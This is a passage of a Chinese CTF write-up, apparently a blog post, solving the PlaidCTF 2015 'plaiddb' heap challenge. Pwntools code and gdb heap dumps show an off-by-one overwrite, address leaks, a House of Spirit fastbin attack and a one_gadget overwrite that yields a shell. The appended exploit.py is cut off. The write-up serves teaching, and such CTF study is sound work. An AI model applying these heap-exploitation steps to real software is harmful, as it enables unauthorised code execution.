+<h2 id="预备部分"><a href="#预备部分" class="headerlink" title="预备部分"></a>预备部分</h2><p>因为程序开启了全部的保护，FULL ASLR导致所有地址都是随机的。<br>需要通过double free来泄漏heap、libc、程序本体（可不用）的真实地址。<br> <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"> checksec</span><br><span class="line">CANARY    : ENABLED</span><br><span class="line">FORTIFY   : ENABLED</span><br><span class="line">NX        : ENABLED</span><br><span class="line">PIE       : ENABLED</span><br><span class="line">RELRO     : FULL</span><br></pre></td></tr></table></figure><br><strong>Prev_Inuse</strong><br>用于判断前一个chunk是否free，如果该bit为0，在free该chunk时，会自动和前一个chunk合并。而前一个chunk的size就是目前可控的pre_size.(因为chunk的data区域是可以写入下一个chunk的pre_size区域的)<br>这里再复习一下之前how2heap中consolidate技术，就是利用preinuse的特性来造成double free。fastbin是不会修改preinuse的值，所以可以用来伪造unlink。</p>
+<p>逆向一下<strong>datastore</strong>的结构体<br>主要关注的是前三个，注意需要熟悉伪代码中对这三个区域的mallc和free操作，本文不详细讲解了。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">Struct TreeNode&#123;</span><br><span class="line">char * rowkey;</span><br><span class="line">Int size;</span><br><span class="line">char data;</span><br><span class="line">TreeNode *left;</span><br><span class="line">TreeNode *right;</span><br><span class="line">TreeNode *parent;</span><br><span class="line">Bool is_leef;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>Fast bin（无符号表的情况下，通过small bins计算/笔者是通过find结点直接搜的）</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">x&#x2F;20xg 0x7ffff7dce768</span><br><span class="line">0x7ffff7dce768: 0x00005555557580e0  0x0000000000000000</span><br><span class="line">0x7ffff7dce778: 0x0000555555758270  0x0000000000000000</span><br><span class="line">0x7ffff7dce788: 0x0000000000000000  0x0000000000000000</span><br></pre></td></tr></table></figure>
+
+<h2 id="OFF-BY-ONE部分"><a href="#OFF-BY-ONE部分" class="headerlink" title="OFF BY ONE部分"></a>OFF BY ONE部分</h2><p>通过off by one来制造double free漏洞<br>off_by_one可以覆盖掉下一个chunk的size的最低byte<br>1.使得下个chunk的size变小<br>2.使得pre_inuse bit被改为0<br>下一个chunk被free掉时，会和前一个chunk合并（如果前一个chunk是free的话，即pre_inuse为0），前一个chunk由当前写入的prevsize（可控，chunk的头8个字节）来指定。通过控制pre size可以合并一个非常大的chunk，导致double free。</p>
+<p>首先构造堆的结构，为后面的地址泄漏最好备案。<br>这里给出笔者的布置的结构，这个结构并不唯一，并且不一定是最优解，读者可以将其作为参考。<br>PUT(“d”*8,2,’D’) #为后文的 LEAK 做准备，暂且不用管</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">PUT(&quot;a&quot;*8,128,&#39;A&#39;*128) </span><br><span class="line">PUT(&quot;b&quot;*8,2,&#39;B&#39;)</span><br><span class="line">PUT(&quot;c&quot;*8,2,&#39;C&#39;)</span><br><span class="line">PUT(&quot;b&quot;*8,248,&#39;B&#39;*248) #为Tree B重新申请data空间</span><br><span class="line">PUT(&quot;c&quot;*8,280,&#39;C&#39;*248+p64(0x21)+&#39;C&#39;*24) #为Tree C重新申请data空间</span><br><span class="line">#以上步骤是为了让B和C的data部分相邻</span><br><span class="line">#C的data部分构造是为了防止 next size check #invalid next size (normal) 的check</span><br><span class="line">#因为off by one 会导致 size最后一位被覆盖为0 ，所以data部分的大小会变小，需要构造一个fake结构来绕过检查。（详见glibc 源代码）</span><br></pre></td></tr></table></figure>
+
+<p>构造的结构</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></td><td class="code"><pre><span class="line">0x555555758080: 0x0000000000000000   0x0000000000000041 &lt;--TREE_D</span><br><span class="line">0x555555758090: 0x00005555557580d0 0x0000000000000002</span><br><span class="line">0x5555557580a0: 0x00005555557580f0  0x0000555555758200</span><br><span class="line">0x5555557580b0: 0x0000555555758010 0x0000000000000000</span><br><span class="line">0x5555557580c0: 0x0000000000000000   0x0000000000000021 &lt;--D-&gt;rowkey</span><br><span class="line">0x5555557580d0: 0x6464646464646464   0x0000000000000000</span><br><span class="line">0x5555557580e0: 0x0000000000000000   0x0000000000000021</span><br><span class="line">0x5555557580f0:     0x0000000000000a44   0x0000000000000000 &lt;--D-&gt;data</span><br><span class="line">0x555555758100: 0x0000000000000000   0x0000000000000041 &lt;--TREE_A</span><br><span class="line">0x555555758110: 0x0000555555758150   0x0000000000000080</span><br><span class="line">0x555555758120: 0x0000555555758170   0x0000000000000000</span><br><span class="line">0x555555758130: 0x0000000000000000   0x0000555555758200</span><br><span class="line">0x555555758140: 0x0000000000000001   0x0000000000000021</span><br><span class="line">0x555555758150: 0x6161616161616161 0x0000000000000000 &lt;--A-&gt;rowkey</span><br><span class="line">0x555555758160: 0x0000000000000000   0x0000000000000091</span><br><span class="line">0x555555758170: 0x4141414141414141   0x4141414141414141&lt;--A-&gt;data</span><br><span class="line">0x555555758180: 0x4141414141414141   0x4141414141414141</span><br><span class="line">0x555555758190: 0x4141414141414141   0x4141414141414141</span><br><span class="line">0x5555557581a0: 0x4141414141414141   0x4141414141414141</span><br><span class="line">0x5555557581b0: 0x4141414141414141   0x4141414141414141</span><br><span class="line">0x5555557581c0: 0x4141414141414141 0x4141414141414141</span><br><span class="line">0x5555557581d0: 0x4141414141414141   0x4141414141414141</span><br><span class="line">0x5555557581e0: 0x4141414141414141   0x4141414141414141</span><br><span class="line">0x5555557581f0:     0x0000000000000000   0x0000000000000041&lt;--TREE_B</span><br><span class="line">0x555555758200: 0x0000555555758240   0x00000000000000f8</span><br><span class="line">0x555555758210: 0x0000555555758360   0x0000555555758110</span><br><span class="line">0x555555758220: 0x0000555555758280   0x0000555555758090</span><br><span class="line">0x555555758230: 0x0000000000000000   0x0000000000000021</span><br><span class="line">0x555555758240: 0x6262626262626262   0x0000000000000000&lt;--B-&gt;rowkey</span><br><span class="line">0x555555758250: 0x0000000000000000   0x0000000000000021</span><br><span class="line">0x555555758260: 0x0000555555758330   0x0000000000000000</span><br><span class="line">0x555555758270: 0x0000000000000000   0x0000000000000041&lt;--TREE_C</span><br><span class="line">0x555555758280: 0x00005555557582c0 0x0000000000000118</span><br><span class="line">0x555555758290: 0x0000555555758460   0x0000000000000000</span><br><span class="line">0x5555557582a0: 0x0000000000000000   0x0000555555758200</span><br><span class="line">0x5555557582b0: 0x0000000000000001 0x0000000000000021&lt;--C-&gt;rowkey</span><br><span class="line">0x5555557582c0: 0x6363636363636363   0x0000000000000000</span><br><span class="line">0x5555557582d0: 0x0000000000000000   0x0000000000000021</span><br><span class="line">0x5555557582e0: 0x0000555555758250 0x0000000000000000</span><br><span class="line">0x5555557582f0:     0x0000000000000000   0x0000000000000041</span><br><span class="line">0x555555758300: 0x0000000000000000   0x0000000000000118</span><br><span class="line">0x555555758310: 0x0000555555758460   0x0000000000000000</span><br><span class="line">0x555555758320: 0x0000000000000000   0x0000000000000000</span><br><span class="line">0x555555758330: 0x0000000000000000 0x0000000000000021</span><br><span class="line">0x555555758340: 0x0000000000000000   0x0000000000000000</span><br><span class="line">0x555555758350: 0x0000000000000000   0x0000000000000101</span><br><span class="line">0x555555758360: 0x4242424242424242   0x4242424242424242&lt;--B-&gt;data</span><br><span class="line">0x555555758370: 0x4242424242424242   0x4242424242424242</span><br><span class="line"> ...</span><br><span class="line">0x555555758430: 0x4242424242424242   0x4242424242424242</span><br><span class="line">0x555555758440: 0x4242424242424242 0x4242424242424242</span><br><span class="line">0x555555758450: 0x4242424242424242   0x0000000000000121</span><br><span class="line">0x555555758460: 0x4343434343434343   0x4343434343434343&lt;--C-&gt;data</span><br><span class="line">0x555555758470: 0x4343434343434343   0x4343434343434343</span><br><span class="line">0x555555758480: 0x4343434343434343 0x4343434343434343</span><br><span class="line"> ...</span><br><span class="line">0x555555758530: 0x4343434343434343  0x4343434343434343</span><br><span class="line">0x555555758540: 0x4343434343434343  0x4343434343434343</span><br><span class="line">0x555555758550: 0x4343434343434343  0x0000000000000021</span><br><span class="line">0x555555758560: 0x4343434343434343  0x4343434343434343</span><br><span class="line">0x555555758570: 0x4343434343434343  0x0000000000020a91 &lt;--TOP CHUNK</span><br></pre></td></tr></table></figure>
+
+<p><strong>通过DEL溢出字节</strong><br>使用DEL实现off by one而不是GET（调用的统一函数），因为GET函数中在查找失败之后，会free刚才malloc的区域，如我们crash的结果，会检测下一个malloc chunk的next inuse，如果被释放则会crash。而DEL这个函数如果没有找到row key，直接return，就不会触发free。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">DEL(&quot;b&quot;*8) #删除B-&gt;data</span><br><span class="line">#首先占位B-&gt;data，然后堆C-&gt;data产生溢出</span><br><span class="line">DEL(&#39;X&#39;*240+p64(752)) #240+8&#x3D;248   &lt;--!off by one </span><br><span class="line">DEL(&quot;a&quot;*8) #将A-&gt;data的inuse清零，等待合并</span><br><span class="line">#free C--&gt;data时，发生向前的合并，因为控制了presize的原因，使得从A-&gt;Data到C-&gt;data合并为一个超长Free Chunk</span><br><span class="line">DEL(&quot;c&quot;*8)</span><br></pre></td></tr></table></figure>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line">0x555555758160: 0x0000000000000000  0x00000000000003f1 &lt;-size</span><br><span class="line">0x555555758170: 0x00007ffff7dce7b8  0x00007ffff7dce7b8 &lt;--Free CHUNK</span><br><span class="line">0x555555758180: 0x4141414141414141  0x4141414141414141</span><br><span class="line">...</span><br><span class="line">0x5555557581e0: 0x4141414141414141  0x4141414141414141</span><br><span class="line">0x5555557581f0: 0x0000000000000090  0x0000000000000040</span><br><span class="line">0x555555758200: 0x00005555557582f0  0x5858585858585858</span><br><span class="line">0x555555758210: 0x5858585858585858   0x5858585858585858</span><br><span class="line">0x555555758220: 0x5858585858585858   0x5858585858585858</span><br><span class="line">0x555555758230: 0x5858585858585858   0x0000000000000021</span><br><span class="line">0x555555758240: 0x0000555555758250   0x0000000000000000</span><br><span class="line">0x555555758250: 0x0000000000000000   0x0000000000000021</span><br><span class="line">0x555555758260: 0x0000555555758330   0x0000000000000000</span><br><span class="line">0x555555758270: 0x0000000000000000 0x0000000000000041</span><br><span class="line">0x555555758280: 0x0000555555758100   0x0000000000000118</span><br><span class="line">0x555555758290: 0x0000555555758460 0x0000000000000000</span><br><span class="line">0x5555557582a0: 0x0000000000000000   0x0000555555758090</span><br><span class="line">0x5555557582b0: 0x0000000000000000   0x0000000000000021</span><br><span class="line">0x5555557582c0: 0x0000555555758140   0x0000000000000000</span><br><span class="line">0x5555557582d0: 0x0000000000000000   0x0000000000000021</span><br><span class="line">0x5555557582e0: 0x00005555557582b0 0x5858585858585800</span><br><span class="line">0x5555557582f0:     0x5858585858585858   0x0000000000000041</span><br><span class="line">0x555555758300: 0x0000000000000000   0x0000000000000118</span><br><span class="line">0x555555758310: 0x0000555555758460   0x0000000000000000</span><br><span class="line">0x555555758320: 0x0000000000000000   0x0000000000000000</span><br><span class="line">0x555555758330: 0x0000000000000000 0x0000000000000021</span><br><span class="line">0x555555758340: 0x0000000000000000   0x0000000000000000</span><br><span class="line">0x555555758350: 0x0000000000000000   0x0000000000000101</span><br><span class="line">0x555555758360: 0x5858585858585858   0x5858585858585858</span><br><span class="line">0x555555758370: 0x5858585858585858   0x5858585858585858</span><br><span class="line">...</span><br><span class="line">0x555555758440: 0x5858585858585858  0x5858585858585858</span><br><span class="line">0x555555758450: 0x00000000000002f0  0x0000000000000100</span><br><span class="line">0x555555758460: 0x4343434343434343   0x4343434343434343</span><br><span class="line">...</span><br><span class="line">0x555555758540: 0x4343434343434343 0x4343434343434343</span><br><span class="line">0x555555758550: 0x00000000000003f0  0x0000000000000020</span><br><span class="line">0x555555758560: 0x4343434343434343 0x4343434343434343</span><br><span class="line">0x555555758570: 0x4343434343434343   0x0000000000020a91</span><br></pre></td></tr></table></figure>
+
+<h2 id="任意地址读"><a href="#任意地址读" class="headerlink" title="任意地址读"></a>任意地址读</h2><p><strong>LEAK HEAP</strong><br>通过LEAK布置在CHUNK KEY1中的CHUNK LEAK HEAP的指针，可以计算出HEAP的基地址。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">#首先对Free Chunk进行占位，块名KEY1</span><br><span class="line">DEL(&quot;d&quot;*8) #防止TreeNode结构申请到Free Chunk中间，所以先释放Chunk_D,到fastbin中（FILO）</span><br><span class="line">PUT(&quot;KEY1&quot;,1000,(&quot;K&quot;*264+p64(64)+p64(0)+&quot;K&quot;*48+p64(33)+p64(0)+&quot;K&quot;*24+&quot;KEY1\x00&quot;).ljust(999,&quot;\x01&quot;)) # &lt;--占位，内部数据可以直接copy原内存，防止报错。</span><br><span class="line">PUT(&quot;LEAKBUF&quot;,8,&#39;LEAKBUF&#39;) #占位Free Chunk内部的fastbin chunk</span><br><span class="line"></span><br><span class="line">DEL(&quot;123&quot;)#Avoid next chunk size check</span><br><span class="line">GET(&quot;KEY1&quot;) #打印KEY1内容</span><br><span class="line">p.recvuntil(&quot; bytes]:&quot;)</span><br><span class="line">KEY1&#x3D;p.recv(1000)</span><br><span class="line"></span><br><span class="line">#LEAK HEAP</span><br><span class="line">#提取LEAK_CHUNK的指针，计算好出堆地址</span><br><span class="line">LEAK_HEAP&#x3D;u64(KEY1[273:280].ljust(8,&quot;\x00&quot;)) HEAP_ADDR&#x3D;LEAK_HEAP-0xf0</span><br><span class="line">print &quot;HEAP_ADDR&#x3D;&quot;+hex(HEAP_ADDR) #TreeNode-&gt;row_key-offset</span><br></pre></td></tr></table></figure>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">0x555555758160: 0x0000000000000000  0x00000000000003f1</span><br><span class="line">0x555555758170: 0x4b4b4b4b4b4b4b4b 0x4b4b4b4b4b4b4b4b</span><br><span class="line">...</span><br><span class="line">0x555555758260: 0x4b4b4b4b4b4b4b4b 0x4b4b4b4b4b4b4b4b</span><br><span class="line">0x555555758270: 0x4b4b4b4b4b4b4b4b 0x0000000000000040 &lt;--LEAK BUF</span><br><span class="line">0x555555758280: 0x00005555557580f0  0x0000000000000008  &lt;--L-&gt;row key</span><br><span class="line">0x555555758290: 0x00005555557580d0 0x0000555555758090 &lt;--L-&gt;data</span><br><span class="line">0x5555557582a0: 0x0000555555758010   0x0000000000000000</span><br><span class="line">0x5555557582b0: 0x4b4b4b4b00000000 0x0000000000000021</span><br><span class="line">0x5555557582c0: 0x0000000000333231   0x4b4b4b4b4b4b4b4b</span><br><span class="line">0x5555557582d0: 0x4b4b4b4b4b4b4b4b 0x4b4b4b4b4b4b4b4b</span><br><span class="line">0x5555557582e0: 0x010101003159454b 0x0101010101010101</span><br><span class="line">0x5555557582f0:     0x0101010101010101   0x0101010101010101</span><br><span class="line">...</span><br><span class="line">0x555555758540: 0x0101010101010101   0x0101010101010101</span><br><span class="line">0x555555758550: 0x0a01010101010101   0x0000000000000021</span><br></pre></td></tr></table></figure>
+
+<p><strong>LEAK FUNCTION</strong><br>从这部分开始就比较容易了，通过修改CHUNK LEAK HEAP的指针，可以实现一个任意地址读取。直接上代码</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">#LEAK FUNCTION</span><br><span class="line">def LEAK(addr):</span><br><span class="line">    size&#x3D;0x100</span><br><span class="line">    PUT(&quot;KEY1&quot;,1000,&quot;A&quot;*999) #需要先Free我们的超长CHUNK原因详见Updata部分伪代码</span><br><span class="line">    PUT(&quot;KEY1&quot;,1000,KEY1[1:281]+p64(size)+p64(addr)+KEY1[297:]) </span><br><span class="line">    return GET(&quot;LEAKBUF&quot;)</span><br><span class="line">LEAK(HEAP_ADDR+0x588)</span><br><span class="line">p.recvuntil(&quot;bytes]:&quot;)</span><br><span class="line">LEAK_ADDR&#x3D;p.recv(0x100)</span><br><span class="line">LIBC_ADDR&#x3D;u64(LEAK_ADDR[1:8].ljust(8,&quot;\x00&quot;))-0x3be7b8</span><br><span class="line">print &quot;LIBC_ADDR&#x3D;&quot;+hex(LIBC_ADDR)</span><br></pre></td></tr></table></figure>
+<h2 id="任意地址写"><a href="#任意地址写" class="headerlink" title="任意地址写"></a>任意地址写</h2><p>House of Splrit + Fastbin attack<br>其实如果一开始堆块构造的合理，可以通过覆盖真实的fastbin堆块来实现。因为之前按照winesap师傅的exp写下来时候也没有注意到，所以这里只能结合House of Spirit来，通过释放伪造堆块，来实现fastbin attack。</p>
+<p>House of Spirit利用笔者也是第一次接触，简单看了一下概念就直接写了exploit。关键要素是free掉我们构造的fake chunk。<br>do_DEL部分代码,因为我们拥有一个可控chunk（LEAK BUF），所以可以通过修改data/rowkey指针来free掉我们布置在堆内的fakechunk</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">free(TreeNode); </span><br><span class="line">free(*(void **)(TreeNode-&gt;data));</span><br><span class="line">free(TreeNode-&gt;rowkey);</span><br><span class="line">free(v1);</span><br><span class="line">return puts(&quot;INFO: Delete successful.&quot;);</span><br></pre></td></tr></table></figure>
+<p>实现代码</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">#House of Spirit</span><br><span class="line">fake_chunk&#x3D;HEAP_ADDR+0x2f0</span><br><span class="line">one_gadget&#x3D;0xe58c5+LIBC_ADDR</span><br><span class="line">address&#x3D;LIBC_ADDR+0x3BE740-35#address&#x3D;0x66666666</span><br><span class="line"></span><br><span class="line">PUT(&quot;KEY1&quot;,1000,&quot;A&quot;*1000)</span><br><span class="line">PUT(&quot;KEY1&quot;,1000,KEY1[1:289]+p64(fake_chunk)+KEY1[297:369]+p64(0)+p64(0x70)+p64(0x70)*16+KEY1[513:]) #0x70 to pass the fast bin next chunk check</span><br><span class="line">DEL(&quot;LEAKBUF&quot;)</span><br><span class="line">GET(&quot;KEY1&quot;)</span><br><span class="line">p.recvuntil(&quot; bytes]:&quot;)</span><br><span class="line">KEY1&#x3D;p.recv(1000)</span><br><span class="line">#PUT(&quot;KEY1&quot;,1000,&quot;A&quot;*1000)</span><br><span class="line">DEL(&quot;KEY1&quot;)</span><br><span class="line">PUT(&quot;KEY1&quot;,1000,KEY1[1:385]+p64(address)+KEY1[393:])</span><br></pre></td></tr></table></figure>
+<p>测试数据address=0x6666666成功修改fastbin链的头</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">x&#x2F;20xg  0x7ffff7dce768</span><br><span class="line">0x7ffff7dce768: 0x0000000066666666  0x0000000000000000</span><br><span class="line">0x7ffff7dce778: 0x0000555555758270  0x0000000000000000</span><br></pre></td></tr></table></figure>
+
+<h2 id="Get-Shell"><a href="#Get-Shell" class="headerlink" title="Get Shell"></a>Get Shell</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">#fastbin attack</span><br><span class="line">PUT(&quot;Fill&quot;,0x60,&quot;F&quot;*0x60)#malloc fake_chunk</span><br><span class="line">PUT(&quot;Fill2&quot;,0x60,&quot;F&quot;*(35-16)+p64(one_gadget)+&quot;F&quot;*(0x60-(35-16)-8)) #any address write</span><br><span class="line">DEL(&quot;GetSHELL&quot;)</span><br></pre></td></tr></table></figure>
+<p>将ASLR开启，运行脚本成功get shell</p>
+<p><img src="https://gitee.com/p0kerface/blog_image_management/raw/master/uploads/AFL_FUZZ20277.png" alt=""></p>
+<h2 id="一些问题的记录"><a href="#一些问题的记录" class="headerlink" title="一些问题的记录"></a>一些问题的记录</h2><p><strong>段错误</strong><br>将我们输入的数据作为了参数，说明我们的参数覆盖了自身TreeNode的结构。<br>此处的原因是TreeNode的head向fastbin申请0x41空间，而此时因为fasbin的LIFO，正好获取了一个在我们这个超长BUF中间的一个空闲chunk，所以PUT这块BUF的时候写入的数据覆盖了自己的BUF。<br>所以exp开头申请的chunk_D就有用武之地了，在PUT之前，先free chunk_D，这样TreeNode的头部就会申请到chunk_D的位置。</p>
+<p><img src="https://gitee.com/p0kerface/blog_image_management/raw/master/uploads/AFL_FUZZ20521.png" alt=""></p>
+<h2 id="新姿势总结"><a href="#新姿势总结" class="headerlink" title="新姿势总结"></a>新姿势总结</h2><p><strong>IDA小技巧</strong><br>字符串优化问题<br>编译时一些字符串类型的数据被优化为了ASCII传入寄存器，所以这里传递给char[]的数据被翻译成了十进制。在IDA中右击选择Char类型，就能看到字符串的内容。</p>
+<p><img src="https://gitee.com/p0kerface/blog_image_management/raw/master/uploads/AFL_FUZZ20628.png" alt=""></p>
+<p><img src="https://gitee.com/p0kerface/blog_image_management/raw/master/uploads/AFL_FUZZ20629.png" alt=""></p>
+<p><img src="https://gitee.com/p0kerface/blog_image_management/raw/master/uploads/AFL_FUZZ20630.png" alt=""></p>
+<p>程序流程简化，IDA会自动优化伪代码，我们将参数删掉（因为并没有传递参数）<br>之后IDA会重新加载，将程序流变得更加简洁。</p>
+<p><img src="https://gitee.com/p0kerface/blog_image_management/raw/master/uploads/AFL_FUZZ20694.png" alt=""></p>
+<p>删除参数,伪代码整洁了很多</p>
+<p>​        <img src="https://gitee.com/p0kerface/blog_image_management/raw/master/uploads/AFL_FUZZ20701.png" alt=""><br><img src="https://gitee.com/p0kerface/blog_image_management/raw/master/uploads/AFL_FUZZ20703.png" alt=""></p>
+<p><img src="https://gitee.com/p0kerface/blog_image_management/raw/master/uploads/AFL_FUZZ20714.png" alt=""></p>
+<p>完整的主函数精简之后，流程就清晰了很多。</p>
+<p><img src="https://gitee.com/p0kerface/blog_image_management/raw/master/uploads/AFL_FUZZ20737.png" alt=""></p>
+<p><strong>Vim</strong><br>使用%!xxd可以直接在字节码层面编辑文本，可以控制一些不可显示的字符（\x0a），对于crash.txt的修改会有比较大的作用。不过vim需要加上-b参数，否则vim会自动给字符串加\x0a，修改会失效。<br><strong>ltrace</strong><br>ltrace -e “malloc+free” ./plaiddb<br>ltrace是一个非常方便的工具，用于查看程序在何时呼叫了某函数（功能不仅仅于此），本题中可以用于追踪malloc/realloc/free操作</p>
+<h1 id="小结"><a href="#小结" class="headerlink" title="小结:"></a>小结:</h1><p>虽然题目虽然是2015年的老题目，但是解出这题所需要的利用手法真的让我收获颇多。首先是FUZZ（可不用），之后还需要构造合适的堆结构结合off by one，最后就是House of Spirit，虽然之前并没有真正接触过，但是通过Writeup的文字描述就能将这个技术实现，也算是很好地诠释了以赛代练的真谛吧。</p>
+<h1 id="参考文献"><a href="#参考文献" class="headerlink" title="参考文献:"></a>参考文献:</h1><p>[1]plaid ctf 2015 plaiddb.0x3f97<br><a href="https://0x3f97.github.io/pwn/2018/01/27/plaidctf2015-plaiddb/[OL/DB],2018-1-27" target="_blank" rel="noopener">https://0x3f97.github.io/pwn/2018/01/27/plaidctf2015-plaiddb/[OL/DB],2018-1-27</a><br>[2]Plaid CTF WriteUP.angelboy<br><a href="http://angelboy.logdown.com/posts/262325-plaid-ctf-2015-write-up%5D[OL/DB],2015-4-28" target="_blank" rel="noopener">http://angelboy.logdown.com/posts/262325-plaid-ctf-2015-write-up%5D[OL/DB],2015-4-28</a></p>
+<h1 id="附录"><a href="#附录" class="headerlink" title="附录"></a>附录</h1><p>exploit.py</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span 